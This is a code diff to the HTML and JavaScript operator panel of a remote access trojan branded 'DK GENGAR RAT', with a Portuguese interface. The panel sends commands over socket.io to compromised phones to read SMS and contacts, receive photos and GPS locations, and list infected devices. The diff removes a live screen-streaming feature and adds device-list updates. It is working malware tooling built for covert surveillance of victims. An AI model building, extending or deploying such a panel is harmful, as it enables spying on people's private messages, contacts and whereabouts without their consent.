@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DK GENGAR RAT - V1.6 (Secured Edition)</title>
+    <title>DK GENGAR RAT - V1.6.6 (Secured Edition)</title>
     <style>
         :root {
             --roxo-sombrio: #1a0033;
@@ -69,16 +69,6 @@
             box-shadow: 0 0 25px var(--verde-neon);
             transform: translateY(-2px);
         }
-        .btn-live {
-            border-color: #ff0055;
-            color: #ff0055;
-            box-shadow: 0 0 10px rgba(255, 0, 85, 0.3);
-        }
-        .btn-live:hover {
-            background: #ff0055;
-            color: white;
-            box-shadow: 0 0 30px #ff0055;
-        }
         #log-terminal {
             background: #000;
             height: 250px;
@@ -100,10 +90,6 @@
             transition: 0.3s;
             position: relative;
         }
-        .device-item:hover {
-            border-color: var(--verde-neon);
-            background: rgba(57, 255, 20, 0.05);
-        }
         .device-item.active {
             border-color: var(--verde-neon);
             background: rgba(57, 255, 20, 0.1);
@@ -120,7 +106,7 @@
         }
         #live-screen-container {
             width: 100%;
-            height: 500px;
+            height: 400px;
             border: 2px solid #333;
             background: #000;
             border-radius: 12px;
@@ -143,9 +129,6 @@
             font-size: 12px;
             color: #666;
         }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: var(--verde-neon); border-radius: 10px; }
     </style>
 </head>
 <body>
@@ -156,11 +139,11 @@
         </div>
         <hr style="width: 100%; border: 0; border-top: 1px solid #333; margin-bottom: 20px;">
         <div id="device-list">
-            <!-- Dispositivos aparecerão aqui dinamicamente -->
+            <p style="color: #666; font-size: 12px; text-align: center;">Aguardando dispositivos...</p>
         </div>
         <div class="watermark">
             Powered by <strong>DK</strong><br>
-            V1.6 Secured Edition
+            V1.6.6 Secured Edition
         </div>
     </div>
 
@@ -173,7 +156,6 @@
                 <button class="btn" onclick="sendCommand('VIBRATE')">📳 Vibrar</button>
                 <button class="btn" onclick="sendCommand('GET_SMS')">💬 Ler SMS</button>
                 <button class="btn" onclick="sendCommand('GET_CONTACTS')">👥 Contatos</button>
-                <button class="btn btn-live" id="btn-live" onclick="toggleLive()">🔴 TELA AO VIVO</button>
             </div>
         </div>
 
@@ -190,7 +172,7 @@
                 <div id="live-screen-container">
                     <div id="live-placeholder" style="text-align: center; color: #444;">
                         <span style="font-size: 40px;">📵</span><br>
-                        Stream de tela inativo
+                        Nenhuma imagem recebida
                     </div>
                     <img id="live-img" style="display:none;" />
                 </div>
@@ -201,9 +183,8 @@
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let isLive = false;
 
-        document.getElementById('initial-log').innerHTML = `[${new Date().toLocaleTimeString()}] <span style="color: white;">DK GENGAR RAT - Sistema Inicializado</span>`;
+        document.getElementById('initial-log').innerHTML = `[${new Date().toLocaleTimeString()}] <span style="color: white;">DK GENGAR RAT - Painel Conectado</span>`;
 
         function sendCommand(cmd) {
             const log = document.getElementById("log-terminal");
@@ -213,34 +194,31 @@
             socket.emit('command', { cmd: cmd });
         }
 
-        function toggleLive() {
-            const btn = document.getElementById("btn-live");
-            const placeholder = document.getElementById("live-placeholder");
-            const img = document.getElementById("live-img");
-            
-            if (!isLive) {
-                isLive = true;
-                btn.innerHTML = "⏹️ PARAR TELA";
-                placeholder.innerHTML = "📡 CONECTANDO AO DISPOSITIVO...";
-                sendCommand("START_SCREEN_STREAM");
-            } else {
-                isLive = false;
-                btn.innerHTML = "🔴 TELA AO VIVO";
-                placeholder.style.display = "block";
-                placeholder.innerHTML = '<span style="font-size: 40px;">📵</span><br>Stream de tela inativo';
-                img.style.display = "none";
-                sendCommand("STOP_SCREEN_STREAM");
+        function updateDeviceList(devices) {
+            const list = document.getElementById("device-list");
+            if (devices.length === 0) {
+                list.innerHTML = '<p style="color: #666; font-size: 12px; text-align: center;">Nenhum dispositivo online.</p>';
+                return;
             }
+            list.innerHTML = "";
+            devices.forEach(dev => {
+                list.innerHTML += `<div class="device-item active">
+                    <span class="status-dot"></span> <strong>${dev.model}</strong><br>
+                    <small style="color: #888;">${dev.os}</small>
+                </div>`;
+            });
         }
 
-        socket.on('screen_frame', (data) => {
-            if (isLive) {
-                const img = document.getElementById("live-img");
-                const placeholder = document.getElementById("live-placeholder");
-                placeholder.style.display = "none";
-                img.style.display = "block";
-                img.src = 'data:image/jpeg;base64,' + data;
-            }
+        socket.on('device_list', (devices) => {
+            updateDeviceList(devices);
+        });
+
+        socket.on('new_device', (data) => {
+            const log = document.getElementById("log-terminal");
+            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: var(--verde-neon);">📱 Novo dispositivo registrado: ${data.model}</span><br>`;
+            log.scrollTop = log.scrollHeight;
+            // Solicita lista atualizada
+            socket.emit('get_device_list');
         });
 
         socket.on('display_photo', (data) => {
@@ -249,17 +227,12 @@
             placeholder.style.display = "none";
             img.style.display = "block";
             img.src = 'data:image/jpeg;base64,' + data;
-            
-            const log = document.getElementById("log-terminal");
-            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📸 Foto recebida e exibida no Preview!</span><br>`;
-            log.scrollTop = log.scrollHeight;
         });
 
         socket.on('display_location', (data) => {
             const log = document.getElementById("log-terminal");
             const googleMapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📍 Localização Recebida: </span><br>`;
-            log.innerHTML += `<a href="${googleMapsUrl}" target="_blank" style="color: #00ff00; text-decoration: underline;">Clique aqui para ver no Google Maps</a><br>`;
+            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📍 Localização Recebida: <a href="${googleMapsUrl}" target="_blank" style="color: #00ff00;">Ver no Mapa</a></span><br>`;
             log.scrollTop = log.scrollHeight;
         });
 
@@ -267,17 +240,6 @@
             const log = document.getElementById("log-terminal");
             log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #fff;">${msg}</span><br>`;
             log.scrollTop = log.scrollHeight;
-        });
-
-        socket.on('new_device', (data) => {
-            const list = document.getElementById("device-list");
-            const log = document.getElementById("log-terminal");
-            log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: var(--verde-neon);">Novo dispositivo conectado: ${data.model}</span><br>`;
-            list.innerHTML = `<div class="device-item active">
-                <strong>${data.model}</strong><br>
-                <small style="color: #888;">OS: ${data.os}</small><br>
-                <small style="color: var(--verde-neon);">Online agora</small>
-            </div>`;
         });
     </script>
 </body>
